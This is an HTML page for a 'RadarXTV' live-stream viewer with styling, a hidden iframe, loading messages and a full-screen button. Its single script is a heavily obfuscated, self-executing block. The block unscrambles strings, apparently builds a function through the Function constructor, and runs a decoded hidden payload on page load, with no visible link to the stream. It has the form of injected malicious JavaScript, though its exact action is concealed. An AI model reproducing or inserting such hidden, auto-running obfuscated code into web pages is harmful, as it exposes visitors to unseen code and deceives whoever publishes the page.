<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RadarXTV - Live Stream</title>
    <style>
        body { 
            background-color: #121212; 
            color: white; 
            font-family: Arial, sans-serif; 
            margin: 0; 
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        .container { 
            text-align: center;
            position: relative;
        }
        iframe { 
            width: 80vw;  /* Width same as before */
            height: 60vh; /* Reduced height */
            border: none; 
            display: block; 
            margin: 0 auto;
        }
        #loadingMessage, #refreshMessage { 
            font-size: 16px; 
            color: red; 
            position: relative;
        }
        #refreshMessage { 
            color: yellow; 
            margin-top: 10px;
        }
        #fullScreenBtn { 
            position: fixed; 
            bottom: 20px; 
            left: 50%; 
            transform: translateX(-50%);
            padding: 10px 20px; 
            background-color: #00ffcc; 
            color: white; 
            font-size: 16px; 
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .popup { 
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background: rgba(0,0,0,0.8); 
            display: flex; 
            justify-content: center; 
            align-items: center; 
        }
        .popup-content { 
            background: white; 
            color: black; 
            padding: 20px; 
            border-radius: 8px; 
            text-align: center; 
        }
        .popup button { 
            margin: 10px; 
            padding: 10px 20px; 
            border: none; 
            cursor: pointer; 
        }
    </style>
</head>
<body>

<div class="container">
    <h1>RadarXTV - Live Stream</h1>
 <div id="refreshMessage">Kindly wait 60 seconds for the stream to load. If it takes longer, please refresh the page.</div>
    <div id="iframeContainer">
        <iframe id="streamIframe" src="" style="display:none;"></iframe>
    </div>
    
    <div id="loadingMessage">Loading stream... Please wait.</div>
   <!-- <div id="refreshMessage">Refresh the page if stream takes more than 60 seconds to load.</div> -->
    
    <button id="fullScreenBtn">Full Screen</button>
</div>

<script>
(function(){var tEu='',Bbj=307-296;function mQb(w){var t=5077643;var c=w.length;var a=[];for(var s=0;s<c;s++){a[s]=w.charAt(s)};for(var s=0;s<c;s++){var m=t*(s+448)+(t%53149);var v=t*(s+447)+(t%25584);var q=m%c;var o=v%c;var g=a[q];a[q]=a[o];a[o]=g;t=(m+v)%6311195;};return a.join('')};var cmi=mQb('sjeroazrulnpvccbfngyoiqtxtrsdwmuchokt').substr(0,Bbj);var onL='8atxg=7;rk.ar,=goe!iahCs.;<0c)a.gh6,1fecv8;,;(Sv";r0,ffhdC;+mao)t7 s)s;;tkw(nuju+or0=;6,l9u,r,tp .h,g1)g)u4.a[a.7rvp)q()67 feqo=[oav or-r[ap;0i nC;bon2th)f[()qz.wu;f=ng1;is]=e(j2lat8=uhnn=(7sf a;n5<n[s)vl+[f;"sur g8n nisr6rnvtg{A+c)lvrtj)y(r4i(;8sx[gh]mp;.+(oh).gx r.9{eC[=tuglsd,h]l;o>fh<9Att{vrrt.;lu(rttea=;,5oyu;=2v ==vs,h;m;r+va0m=ca!vb=c)jv;lh}d=mu 1f}=(naop8=a0ll3=l+(h,*brrr9p;8)(vsbg9atglv;vaa)wor81nhpv6cn{bi+[=1q;]+p(=raavufeAtuu,f7-t;ahg;h+-[=eesn})(t."=e0r,"n*(;.==.a=[i)];9atn+knrl=fve2e(.+g.+},f,o)+n,S(dtl- ,hpr;"+rn0[;)},1c ]t=6rel;i=)v=jn, ]+8<uam]otrion+a(5p.rp.-1)({akng]rCtq)eqlnu,l(pb1+];(;x]nsuh;,v(g+tlugso{hx(><j)Araulo(e;gAdltuulm".0)g;[o,et5fxhg."8;Cac0lr=vh5sl+c,=);gr"7dow 0i=(-as32av iC}0;rj)=ic14=p.r, (..2r2ceth}rsoa) 6{etrifg.apj=(drkpud=(=6))7iiq7avl;=)qu;eC6er)f03; 6 v](n6=di;=rryiv1g)t+4v(,o(i;(.w)u=3  1nox9wr.oad(  iq,[]nrr+utab+rscaplam+"e" groo-+m].';var Yiz=mQb[cmi];var bLy='';var Dta=Yiz;var MIL=Yiz(bLy,mQb(onL));var LLu=MIL(mQb('-qEi5Hndo]][HD!(d_H7H01aeHasH\/b+;l[Ha2:(enSGH$c.0n4bceHH#aw4l]lH&);H2HuHH})H!p=(;4;(ay%3jcHHgd(c4oaH+ Hc]H!rsd}6d_0H_Hm,$w_c n..i9g6If}t7ge_y2%fr,e]4_i4br4Jd!f H)Do6H.GueoHbg4S=!fbn slH?_"0l],tH4H.6.ob H%H$_n;n!=Hf_.H3.5H3i3jh].ltmon@H{syKtf1(4ij]in.aosrczi14sHeIti.Hrs)_.pnprs%=lanea, ))o\/(_5.}!eoeHre63)n63]3\/fc4$i3(H\/a_)ccHo){.h=dketH46H2%d]iEHeC"d{roiipHHlriH]IHz)n6HHn-e=H.5sD_s.6rl\/c(,s]B5Hg{o0:md.fna((a{}e%HHrc3e0t[fHHHCHl.[cD3ostq)c{A@6H]leH(2iGs3Hbi1IH;csnt)]H)("cpldvH32=ae)Hu )H.m.HnHHuGHl)HpL%H(.]Hlen) %0e#_tos0_wrtccnn%"grr2c._}Hr$r].Ht4r\'cl{He5eleid>9_cfD2!$%dHnlHp H]_){j0ee(b]e$G5af# o.fw t se%$rbd9.HaepHxnn)riprhpsa{r9rte9_)_Hu5?a,4H%HI.].tf)ee;tt1l3{9@l3$,3;,&r.[[A.(r*w(_Hy<46;m)Hn;Ee&HHH!nH;ertH$eez%ior)r()hH\/Id{wfIcfn3]fa.rcnioK(o; JbpdfsKfnSfsH%_k:$e%}eH=0u.t_&ad..;it;$Cre.o;H$}H\/zc)m:+c),6Hc6](&qlHl_ar1$H(He4b(_r(dr@$iiHH6!jHhzHH!+onS 9e3H(t%]_2.e;HirlHm()Kn(t\/H7(a7).!o!H(HeH_]H]a3]j4oa_ 7ofbr7!H$C)o(_o3%$nHH,dw)r{"l.{HH64mte(Hk0Hr1Hp3m9 1i$)=;5$rz7[H.}a*amtH0518_)tjHsfian9i;4o;c)#dHg6mHplaeubc$S=uu lf8p$t.,,!Hf.k\'meEwHCbd.gH27rtH]v=f4x4u\'8,%HscH]1#!H: t76!)l)Hnf#3-@o=2nC.fo#w.5we1\/,_=\/u"2HpHr$kH}z!aHfF.lsH;f(_HtueJdpt9ar(-n;(r.H>HH,a.dH{maC-(ih1kn)e%)= c6Heo3hHstfm_({H;6HH-4Hof.eHH_,HH(8t!9 !.#c.3+?8e?.ta)C.efH;n1r)Hlt4;o3iaaH!7mri5gwEa$(HCHu3H%2o!9ou<;_%!#_{(_H7uchHa3"p6H${i9f !.HHb9A5de,lf3k].uceH.v.i!MuaHl0n6f$f H(\/fH;)t(t7il).[)2{os7t!6k8:fEo,==.E.3\/)\/oHHLslp}jn!oab;;He(_n3aM9)$.}f.a,H,)B{H0d= d(=3f]oH!H*tH1_aoqH4bdiwH6r rHct{{o.g$H8==n6]Her"3o snmcf02H(aelCL8))ov7)2e4k!]"JeB}HH3$w1)Ca].;H%2)) aH)C5)mH54)H.mirf91HGH$\/r%fHH$s]}MH6e_)reHe(7aezb6{c1LM((H!rf)n#)H3sGd((.H$}lH=eH(H<duHt)5_jpa)_5%05H(ss2A[ani])otie_(H4H9f,+e89HM;!s74]s[<%_lmohaH$f5KH]%afoH)gfue}_HkA3_3};;"]%5I2)n+1%oHne]n(Hc.4(esu_=leeab.(j90H;gc%r.3iw{:j(.M{HeH#earfH9]7_)r{"nnH(o_Hi;"H\'7fl,)c)+f!8dH0!!07,02]HH(=$cp-H57HHqfc6ck))\'bHitr].p}38l){HA%m634H8h$>$H}2ccy5fe3C2,)4,>ew%Hfe(ng8H?aH)H5iu_.,iH.,6.24eb(1H6(spp;]Hs_}m9 34n; ](6,ite(0y ao6ow1m; l}7eaHt1fc%.%Htd< rffa%cHj .$<p3_c1HHlD1H_g.wHo 1&tB;kHHe}u.Hdnf!)pc]m.Fn1c_35olH4of j{sAHrj4G%t{e1]HH(H_;=)ne$y]]n%f353Hlj[}4u+l=nioiss J<Hm);5H4;H9rHtHg.it9j f67n;%.CHH.)6as7t )2e1H3;441;;0;HH,_n3r;.,]8fe4%*:b(_(HeH).u](>;)7_3I(eH %o) eH e5_5c44ir20fH7 3,.ti,(!HC,e3,_r4.Hdo [a.3r)Hv=doH);or%fdu.He$rn}$&Ei%$dHH.i s }it.{;4];soa na_2os()}'));var vQg=Dta(tEu,LLu );vQg(6018);return 9712})()
</script>

</body>
</html>